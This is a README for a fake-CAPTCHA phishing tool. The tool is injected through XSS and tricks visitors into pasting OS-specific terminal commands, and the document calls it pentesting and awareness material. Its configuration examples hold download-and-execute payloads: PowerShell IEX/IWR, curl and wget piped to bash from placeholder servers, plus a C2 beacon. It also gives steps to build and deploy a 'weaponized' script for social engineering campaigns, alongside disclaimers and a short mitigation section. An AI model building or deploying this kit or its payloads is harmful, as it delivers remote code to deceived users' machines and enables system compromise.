# CoolCaptcha - XSS Pentesting Demonstration Tool

⚠️ **SECURITY RESEARCH & EDUCATIONAL PURPOSE ONLY** ⚠️

This project demonstrates how XSS (Cross-Site Scripting) vulnerabilities can be exploited to manipulate users into executing terminal commands under the guise of a legitimate CAPTCHA verification system.

## 🎯 Purpose

CoolCaptcha is a proof-of-concept tool designed for:
- **Security awareness training**: Demonstrating social engineering through fake CAPTCHAs
- **Penetration testing**: Testing user susceptibility to terminal command execution
- **Red team exercises**: Simulating real-world attack scenarios
- **Educational purposes**: Understanding how UI manipulation can bypass user security awareness

## ⚠️ Ethical Use Only

This tool is intended ONLY for:
- Authorized penetration testing with explicit written permission
- Security research in controlled environments
- Educational demonstrations with proper disclosure
- Red team exercises on systems you own or have permission to test

**DO NOT USE** for malicious purposes, unauthorized testing, or any illegal activities.

## 🔍 How It Works

The tool mimics a legitimate reCAPTCHA interface but includes a deceptive third step that tricks users into running terminal commands:

1. **Step 1**: Standard image selection (appears legitimate)
2. **Step 2**: Pattern drawing verification (builds user trust)
3. **Step 3**: **Malicious terminal command execution** (the actual attack vector)

The interface automatically detects the user's operating system and provides OS-specific command instructions, making the social engineering attack more effective.

## 🚀 Quick Start (For Security Testing)

### Step 1: Installation

```bash
git clone https://github.com/your-repo/CoolCaptcha.git
cd CoolCaptcha
npm install
```

### Step 2: Configure Environment Variables

Create a `.env` file in the project root and customize your payload commands:

```bash
cp .env.example .env
# Edit .env with your desired commands
```

Example `.env` configuration:
```bash
# Probability of showing the captcha (0-1)
RUN_CAPTCHA_CHANCE=1

# Should run if user already verified (for demo purposes)
SHOULD_RUN_IF_VERIFIED=false

# OS-specific terminal commands (customize these for your payload)
CAPTCHA_COMMAND_WINDOWS="powershell -Command \"IEX (IWR https://your-server.com/payload.ps1)\""
CAPTCHA_COMMAND_MAC="curl -s https://your-server.com/macos-payload.sh | bash"
CAPTCHA_COMMAND_LINUX="wget -qO- https://your-server.com/linux-payload.sh | bash"
```

### Step 3: Build the Captcha

```bash
npm run build
```

This compiles your `.env` configuration into a minified, weaponized `dist/captcha.js` file ready for deployment.

**Important Notes:**
- The `.env` file is **not** deployed - only the compiled JavaScript
- Environment variables are baked into the built file at compile time
- For testing during development, use `npm run serve` to run a local server
- Always use `npm run build` before deploying to generate the final payload

### Step 4: Deploy & Use

The built `dist/captcha.js` file contains your configured payloads and can be:

- Hosted on your server for XSS injection scenarios
- Embedded directly in test pages
- Used in social engineering campaigns (authorized testing only)

Example usage:
```html
<!-- Simply include the script - no additional code needed -->
<script src="path/to/captcha.js"></script>
```

### Basic Implementation

```html
<!DOCTYPE html>
<html>
<head>
    <title>Legitimate Website (Attack Simulation)</title>
</head>
<body>
    <!-- Simply loading the script triggers the captcha automatically -->
    <script src="dist/captcha.js"></script>
</body>
</html>
```

## ⚙️ Configuration Options

### Environment Variables (.env)

```bash
# Probability of showing the captcha (0-1)
RUN_CAPTCHA_CHANCE=1

# Should run if user already verified (for demo purposes)
SHOULD_RUN_IF_VERIFIED=false

# OS-specific terminal commands (the actual payload)
CAPTCHA_COMMAND_WINDOWS="start https://customrickroll.github.io/"
CAPTCHA_COMMAND_MAC="open https://customrickroll.github.io/"
CAPTCHA_COMMAND_LINUX="xdg-open https://customrickroll.github.io/"
```

### JavaScript Configuration

```javascript
const captcha = new CoolCaptcha({
    // Custom commands per OS (overrides .env)
    commands: {
        windows: 'powershell -Command "your-payload-here"',
        mac: 'curl "https://your-c2-server.com/beacon"',
        linux: 'wget -qO- "https://your-payload-server.com/script.sh" | bash'
    },

    // Success callback (user completed terminal command)
    onSuccess: () => {
        console.log('Social engineering successful');
    },

    // Failure callback
    onFailure: () => {
        console.log('User abandoned verification');
    }
});
```

## 🛡️ Defense & Mitigation

### For Security Teams

This tool demonstrates vulnerabilities that can be prevented by:

- **Content Security Policy (CSP)**: Prevent unauthorized script injection
- **Input validation**: Sanitize all user inputs to prevent XSS
- **User education**: Train users to recognize suspicious verification requests
- **Terminal restrictions**: Implement policies preventing users from running unknown commands

### Red Flags Users Should Watch For

- CAPTCHAs requesting terminal/command prompt access
- Verification systems asking to run commands outside the browser
- Unexpected multi-step verification on familiar websites
- OS-specific terminal instructions in web interfaces

## Development

### Build Commands

```bash
# Development with hot reload
npm run serve

# Watch for changes
npm run watch

# Production build
npm run build

# Build and serve
npm start
```

### Project Structure

```
CoolCaptcha/
├── src/
│   ├── index.js          # Main captcha class
│   ├── template.html     # Modal HTML template
│   └── styles.css        # Captcha styling
├── dist/
│   └── captcha.js        # Built bundle (generated)
├── index.html            # Demo page
├── webpack.config.js     # Build configuration
└── package.json
```

## 📋 Attack Scenarios

### Social Engineering Flow

1. **Initial Compromise**: Attacker finds XSS vulnerability
2. **Payload Injection**: Malicious captcha script is injected
3. **Trust Building**: User sees familiar reCAPTCHA interface
4. **Escalation**: User completes "normal" verification steps
5. **Terminal Execution**: User unwittingly runs attacker's command
6. **Compromise**: Attacker gains system access

## ⚖️ Legal Notice

**IMPORTANT**: This tool is for authorized security testing only. Unauthorized use against systems you don't own or lack permission to test is illegal and unethical. Always:

- Obtain written permission before testing
- Operate within legal boundaries
- Respect privacy and data protection laws
- Use for defensive security improvement only

## 🔧 Technical Details

- **Frontend**: Vanilla JavaScript (no dependencies)
- **Build**: Webpack with minification
- **Size**: ~20KB minified bundle
- **Compatibility**: Modern browsers with ES6 support
- **Persistence**: Uses localStorage to prevent re-display

## 📚 Educational Resources

- [OWASP XSS Prevention](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [Social Engineering Awareness](https://www.cisa.gov/social-engineering)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)